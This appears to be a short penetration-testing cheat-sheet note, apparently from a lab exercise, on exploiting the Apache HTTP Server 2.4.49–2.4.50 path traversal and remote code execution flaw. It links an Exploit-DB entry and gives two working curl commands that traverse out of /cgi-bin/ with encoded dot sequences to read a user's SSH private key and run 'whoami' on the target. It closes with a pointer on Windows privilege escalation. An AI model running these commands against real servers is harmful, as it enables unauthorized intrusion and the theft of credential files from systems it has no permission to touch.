# Apache HTTP Server 2.4.49 - 2.4.50 - Path Traversal & Remote Code Execution (RCE)

## Enumerate
- phpinfo.php


https://www.exploit-db.com/exploits/50512

```
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; whoami" "http://192.168.231.201/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/alfred/id_rsa"
```

```
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; whoami" "http://192.168.231.201/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/alfred/.ssh/id_rsa"
```

- If Apache `svc_apache` user doesn't have `SeImpersonateToken` privilege check this article: https://itm4n.github.io/localservice-privileges/?source=post_page-----b95d3146cfe9--------------------------------

